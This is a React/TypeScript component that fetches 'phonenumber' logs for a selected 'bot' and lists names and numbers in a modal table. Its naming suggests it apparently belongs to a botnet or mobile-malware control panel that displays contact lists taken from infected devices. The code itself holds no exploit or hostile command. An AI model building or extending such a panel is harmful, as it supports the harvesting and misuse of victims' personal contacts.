import React, {useEffect} from "react";
import {ModalsProps} from "../../../Model/Modal";
import {Button, Modal, Table} from "antd";
import {Bot} from "../../../Model/Bot";
import {useDispatch, useSelector} from "react-redux";
import {AppState} from "../../../Store/RootReducer";
import {getLogsList} from "../../../Store/Logs/Actions";
import {RedoOutlined} from "@ant-design/icons";

interface PhoneNumberLog {
    name: string,
    number: string,
}

export interface ContactsListProps extends ModalsProps {
    bot: Bot,
}

const ContactsList: React.FC<ContactsListProps> = (props: ContactsListProps) => {
    const logsReducer = useSelector((state: AppState) => state.logs);
    const dispatch = useDispatch();

    useEffect(() => {
        if (props.visible) {
            dispatch(getLogsList("phonenumber", props.bot.id, null, logsReducer.filters, logsReducer.sort, 1));
        }
    }, [dispatch, props.bot.id, props.visible]);

    const closeModal = () => {
        props.setVisible(false);
    };


    const refreshContactsList = () => {
        dispatch(getLogsList("phonenumber", props.bot.id, null, logsReducer.filters, logsReducer.sort, 1));
        // message.success("Success refresh contact list");
    };
    /*
    const downloadHTML = () => {
        message.success("action callback");
    };
    */

    const columns = [
        {
            title: "Number",
            dataIndex: "number",
            key: "number",
            render: (text: string, log: PhoneNumberLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>Number</b>
                    </div>
                    <div className="table-col-item">
                        {log.number}
                    </div>
                </div>
            ),
        },
        {
            title: "Name",
            dataIndex: "name",
            key: "name",
            render: (text: string, log: PhoneNumberLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>Name</b>
                    </div>
                    <div className="table-col-item">
                        {log.name}
                    </div>
                </div>
            ),
        },
    ];

    let dataSource: PhoneNumberLog[] = [];

    if (logsReducer.logs.length > 0) {
        dataSource = (logsReducer.logs[0].log) as unknown as PhoneNumberLog[];
    } else {
        dataSource= [];
    }

    const isLoaded = logsReducer.isLoaded && logsReducer.type === "phonenumber" && logsReducer.botId === props.bot.id;

    return (
        <Modal
            title="Contacts list"
            visible={props.visible}
            onCancel={closeModal}
            width={500}
            className="modal-injects"
            destroyOnClose
            footer={[
                <>
                    {/*
                    <Button
                        type="primary"
                        onClick={downloadHTML}
                        icon={<DownloadOutlined/>}
                    >
                        Download as HTML
                    </Button>
                    */}
                    <Button
                        type="primary"
                        onClick={refreshContactsList}
                        icon={<RedoOutlined/>}
                    >
                        Refresh
                    </Button>
                    <Button
                        type="primary"
                        onClick={closeModal}
                        danger
                    >
                        Close
                    </Button>
                </>,
            ]}
        >
            <div className="table-scroll" style={{maxHeight: 250, overflowY: "auto"}}>
                <Table
                    columns={columns}
                    dataSource={isLoaded ? dataSource : []}
                    loading={!isLoaded}
                    size="small"
                    pagination={false}
                    sticky={true}
                    className="not-responsive"
                />
            </div>
        </Modal>
    );
};

export default ContactsList;
